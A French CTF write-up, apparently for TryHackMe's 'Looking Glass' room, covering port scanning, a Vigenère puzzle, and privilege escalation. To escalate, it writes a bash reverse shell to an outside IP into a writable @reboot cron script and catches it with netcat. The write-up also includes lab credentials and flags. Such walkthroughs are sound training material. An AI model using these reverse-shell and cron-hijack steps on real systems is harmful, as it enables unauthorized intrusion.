# Looking Glass #

## Task 1 Looking Glass ##

```bash
tim@kali:~/Bureau/tryhackme/write-up/file$ sudo sh -c "echo '10.10.73.140 lookingglass.thm' >> /etc/hosts"
[sudo] Mot de passe de tim : 


tim@kali:~/Bureau/tryhackme/write-up/file$ sudo nmap -A lookingglass.thm 
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 3f:15:19:70:35:fd:dd:0d:07:a0:50:a3:7d:fa:10:a0 (RSA)
|   256 a8:67:5c:52:77:02:41:d7:90:e7:ed:32:d2:01:d9:65 (ECDSA)
|_  256 26:92:59:2d:5e:25:90:89:09:f5:e5:e0:33:81:77:6a (ED25519)
9000/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9001/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9002/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9003/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9009/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9010/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9011/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9040/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9050/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9071/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9080/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9081/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9090/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9091/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9099/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9100/tcp  open  jetdirect?
9101/tcp  open  jetdirect?
9102/tcp  open  jetdirect?
9103/tcp  open  jetdirect?
9110/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9111/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9200/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9207/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9220/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9290/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9415/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9418/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9485/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9500/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9502/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9503/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9535/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9575/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9593/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9594/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9595/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9618/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9666/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9876/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9877/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9878/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9898/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9900/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9917/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9929/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9943/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9944/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9968/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9998/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
|_uptime-agent-info: SSH-2.0-dropbear\x0D
9999/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
10000/tcp open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
10001/tcp open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
10002/tcp open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
10003/tcp open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
10004/tcp open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
10009/tcp open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
10010/tcp open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
10012/tcp open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
10024/tcp open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
10025/tcp open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
10082/tcp open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
10180/tcp open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
10215/tcp open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
10243/tcp open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
10566/tcp open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
10616/tcp open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
10617/tcp open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
10621/tcp open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
10626/tcp open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
10628/tcp open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
10629/tcp open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
10778/tcp open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
11110/tcp open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
11111/tcp open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
11967/tcp open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
12000/tcp open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
12174/tcp open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
12265/tcp open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
12345/tcp open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
13456/tcp open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
13722/tcp open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
13782/tcp open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
13783/tcp open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=9/2%OT=22%CT=1%CU=41401%PV=Y%DS=2%DC=T%G=Y%TM=6130E75A
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M506ST11NW6%O2=M506ST11NW6%O3=M506NNT11NW6%O4=M506ST11NW6%O5=M506ST11
OS:NW6%O6=M506ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(
OS:R=Y%DF=Y%T=40%W=F507%O=M506NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   32.82 ms 10.9.0.1
2   33.86 ms lookingglass.thm (10.10.73.140)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 145.73 seconds
```

Ici on voit un service legit SSH sur le port 22.   
Puis plein d'autre service SSH sur plein de ports.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ ssh lookingglass.thm -o StrictHostKeyChecking=no  -p 9000
Lower
Connection to lookingglass.thm closed.

tim@kali:~/Bureau/tryhackme/write-up$ ssh lookingglass.thm -o StrictHostKeyChecking=no  -p 13000
Warning: Permanently added '[lookingglass.thm]:13000,[10.10.73.140]:13000' (RSA) to the list of known hosts.
Lower
Connection to lookingglass.thm closed.
```

Le serveur joue au jeu du plus ou moins nous allons.

```python
tim@kali:~/Bureau/tryhackme/write-up$ cat cherche.py 
import os

debut = 9000
fin = 14000
milieu = 0


while True :
    milieu = int((fin-debut)/2+debut)
    cmd = "ssh lookingglass.thm -o StrictHostKeyChecking=no  -p " + str(milieu)
    resultat = os.popen(cmd).read()
    
    if resultat.find('Lower') >= 0:
        debut = milieu
    elif resultat.find('Higher') >= 0:
        fin = milieu
    else:
        print(milieu)
        print(resultat)
        break
```

On crée un script python qui teste à notre place les ports.  
Le script fait une recherche pas dichotomie, suivant le résultat il va cherche sur la borne inférieur ou supérieur.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ python3 cherche.py 
Connection to lookingglass.thm closed.
Connection to lookingglass.thm closed.
Connection to lookingglass.thm closed.
Connection to lookingglass.thm closed.
Connection to lookingglass.thm closed.
Connection to lookingglass.thm closed.
Connection to lookingglass.thm closed.
Connection to lookingglass.thm closed.
Connection to lookingglass.thm closed.
Connection to lookingglass.thm closed.
13828
You've found the real service.
Solve the challenge to get access to the box
Jabberwocky
'Mdes mgplmmz, cvs alv lsmtsn aowil
Fqs ncix hrd rxtbmi bp bwl arul;
Elw bpmtc pgzt alv uvvordcet,
Egf bwl qffl vaewz ovxztiql.

'Fvphve ewl Jbfugzlvgb, ff woy!
Ioe kepu bwhx sbai, tst jlbal vppa grmjl!
Bplhrf xag Rjinlu imro, pud tlnp
Bwl jintmofh Iaohxtachxta!'

Oi tzdr hjw oqzehp jpvvd tc oaoh:
Eqvv amdx ale xpuxpqx hwt oi jhbkhe--
Hv rfwmgl wl fp moi Tfbaun xkgm,
Puh jmvsd lloimi bp bwvyxaa.

Eno pz io yyhqho xyhbkhe wl sushf,
Bwl Nruiirhdjk, xmmj mnlw fy mpaxt,
Jani pjqumpzgn xhcdbgi xag bjskvr dsoo,
Pud cykdttk ej ba gaxt!

Vnf, xpq! Wcl, xnh! Hrd ewyovka cvs alihbkh
Ewl vpvict qseux dine huidoxt-achgb!
Al peqi pt eitf, ick azmo mtd wlae
Lx ymca krebqpsxug cevm.

'Ick lrla xhzj zlbmg vpt Qesulvwzrr?
Cpqx vw bf eifz, qy mthmjwa dwn!
V jitinofh kaz! Gtntdvl! Ttspaj!'
Wl ciskvttk me apw jzn.

'Awbw utqasmx, tuh tst zljxaa bdcij
Wph gjgl aoh zkuqsi zg ale hpie;
Bpe oqbzc nxyi tst iosszqdtz,
Eew ale xdte semja dbxxkhfe.
Jdbr tivtmi pw sxderpIoeKeudmgdstd
Enter Secret:	
Incorrect secret.

```

On lance le programme et quand le curseur de clignote plus appuyer sur entrer.  
On trouve un texte mais il est chiffré.  

On trouve un nom qui est jabberwocky.
On fait une recherche sur wikipedia [wikipedia jabberwocky](https://en.wikipedia.org/wiki/Jabberwocky), et on trouve un poème qui a pour nom jabberwocky.   

Le texte en encodé avec la méthode vigénère.   

![page1](./Task1-01.png)  

On la casse le code sur le site [guballa](https://www.guballa.de/vigenere-solver)

On trouve une clef qui est : bewareTheJabberwock   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ ssh lookingglass.thm -o StrictHostKeyChecking=no  -p 13828
You've found the real service.
Solve the challenge to get access to the box
Jabberwocky
'Mdes mgplmmz, cvs alv lsmtsn aowil
Fqs ncix hrd rxtbmi bp bwl arul;
Elw bpmtc pgzt alv uvvordcet,
Egf bwl qffl vaewz ovxztiql.

'Fvphve ewl Jbfugzlvgb, ff woy!
Ioe kepu bwhx sbai, tst jlbal vppa grmjl!
Bplhrf xag Rjinlu imro, pud tlnp
Bwl jintmofh Iaohxtachxta!'

Oi tzdr hjw oqzehp jpvvd tc oaoh:
Eqvv amdx ale xpuxpqx hwt oi jhbkhe--
Hv rfwmgl wl fp moi Tfbaun xkgm,
Puh jmvsd lloimi bp bwvyxaa.

Eno pz io yyhqho xyhbkhe wl sushf,
Bwl Nruiirhdjk, xmmj mnlw fy mpaxt,
Jani pjqumpzgn xhcdbgi xag bjskvr dsoo,
Pud cykdttk ej ba gaxt!

Vnf, xpq! Wcl, xnh! Hrd ewyovka cvs alihbkh
Ewl vpvict qseux dine huidoxt-achgb!
Al peqi pt eitf, ick azmo mtd wlae
Lx ymca krebqpsxug cevm.

'Ick lrla xhzj zlbmg vpt Qesulvwzrr?
Cpqx vw bf eifz, qy mthmjwa dwn!
V jitinofh kaz! Gtntdvl! Ttspaj!'
Wl ciskvttk me apw jzn.

'Awbw utqasmx, tuh tst zljxaa bdcij
Wph gjgl aoh zkuqsi zg ale hpie;
Bpe oqbzc nxyi tst iosszqdtz,
Eew ale xdte semja dbxxkhfe.
Jdbr tivtmi pw sxderpIoeKeudmgdstd
Enter Secret:	
jabberwock:ChildJourneyTreacleOffered
Connection to lookingglass.thm closed.
```

En mettant la clef la session nous donne un identifiant qui est :    
Nom : jabberwock      
Mot de passe : ChildJourneyTreacleOffered        

**Get the user flag.**

```bash
tim@kali:~/Bureau/tryhackme/write-up$ ssh jabberwock@lookingglass.thm 
jabberwock@lookingglass.thm's password: 
Last login: Fri Jul  3 03:05:33 2020 from 192.168.170.1
jabberwock@looking-glass:~$ cat user.txt
}32a911966cab2d643f5d57d9e0173d56{mht
```

On se connect à l'utilisateur jabberwock, on trouve un fichier user.txt mais le contenu est inversé.   

```bash
jabberwock@looking-glass:~$ cat user.txt | rev
thm{65d3710e9d75d5f346d2bac669119a23}
```

On inverse la chaîne est on trouve le flag.   

La réponse est : thm{65d3710e9d75d5f346d2bac669119a23}    

**Get the root flag.**

```bash
jabberwock@looking-glass:~$ sudo -l
Matching Defaults entries for jabberwock on looking-glass:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jabberwock may run the following commands on looking-glass:
    (root) NOPASSWD: /sbin/reboot
```

On regarde dans la configuration sudo.   
On peut exécuter reboot sans mot de passe avec les droits root.     

```bash
jabberwock@looking-glass:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
@reboot tweedledum bash /home/jabberwock/twasBrillig.sh
```

On voit dans le crontab que quand on redémare on exécute un fichier twsBrilling.sh    

```bash
jabberwock@looking-glass:~$ ls -al twasBrillig.sh 
-rwxrwxr-x 1 jabberwock jabberwock 38 Jul  3  2020 twasBrillig.sh

jabberwock@looking-glass:~$ cat /home/jabberwock/twasBrillig.sh 
wall $(cat /home/jabberwock/poem.txt)
```

On peut modifier le twsBrilling.sh.  
Le script affiche le contenu du fichier poem.txt à tout les utilisateurs.    

```bash
jabberwock@looking-glass:~$ echo "bash -i >& /dev/tcp/10.9.228.66/1234 0>&1" > twasBrillig.sh    
```

On inclut un reverse shell dans twsBrilling.sh

```bash
tim@kali:~/Bureau/tryhackme/write-up$ nc -lnvp 1234
listening on [any] 1234 ...
```

On écoute le port 1234 pour se connecter au reverse shell.    

```bash
jabberwock@looking-glass:~$ sudo /sbin/reboot
```

On attend quelques minutes et on a un nouveau shell.

```bash
tim@kali:~/Bureau/tryhackme/write-up$ nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.9.228.66] from (UNKNOWN) [10.10.73.140] 52664
bash: cannot set terminal process group (854): Inappropriate ioctl for device
bash: no job control in this shell
tweedledum@looking-glass:~$ id
id
uid=1002(tweedledum) gid=1002(tweedledum) groups=1002(tweedledum)
tweedledum@looking-glass:~$ ls
ls
humptydumpty.txt
poem.txt
tweedledum@looking-glass:~$ cat humptydumpty.txt
cat humptydumpty.txt
dcfff5eb40423f055a4cd0a8d7ed39ff6cb9816868f5766b4088b9e9906961b9
7692c3ad3540bb803c020b3aee66cd8887123234ea0c6e7143c0add73ff431ed
28391d3bc64ec15cbb090426b04aa6b7649c3cc85f11230bb0105e02d15e3624
b808e156d18d1cecdcc1456375f8cae994c36549a07c8c2315b473dd9d7f404f
fa51fd49abf67705d6a35d18218c115ff5633aec1f9ebfdc9d5d4956416f57f6
b9776d7ddf459c9ad5b0e1d6ac61e27befb5e99fd62446677600d7cacef544d0
5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
7468652070617373776f7264206973207a797877767574737271706f6e6d6c6b
```

On trouve un fichier avec hash.

```bash
tim@kali:~/Bureau/tryhackme/write-up$ hash-identifier dcfff5eb40423f055a4cd0a8d7ed39ff6cb9816868f5766b4088b9e9906961b9
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------

Possible Hashs:
[+] SHA-256
[+] Haval-256
```

hash-identifier nous dit que c'est du SHA-256.   

![page2](./Task1-02.png) 

On crack les hashs avec crackstation 7 hash sont cassés, mais c'est une phrase.   
Le dernier hash ressemble a du code héxadécimale ascii.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ echo "7468652070617373776f7264206973207a797877767574737271706f6e6d6c6b" | sed 's/\(..\)/\1 /g' | hex2raw 
the password is zyxwvutsrqponmlk
```

On convertie la chaîne en ascii est on trouve le mot de passe suivant : zyxwvutsrqponmlk   

```bash
ls /home
alice
humptydumpty
jabberwock
tryhackme
tweedledee
tweedledum
tweedledum@looking-glass:~$ 

tweedledum@looking-glass:~$ python3 -c "import pty;pty.spawn('/bin/sh')"
python3 -c "import pty;pty.spawn('/bin/sh')"
$ su humptydumpty
su humptydumpty
Password: zyxwvutsrqponmlk

humptydumpty@looking-glass:/home/tweedledum$ 
```

On voit qu'il y a un utilisateur humptydumpty, on se connect avec le mot de passe trouvé précédament. 

```bash
ls -al /home/
total 32
drwxr-xr-x  8 root         root         4096 Jul  3  2020 .
drwxr-xr-x 24 root         root         4096 Jul  2  2020 ..
drwx--x--x  6 alice        alice        4096 Jul  3  2020 alice
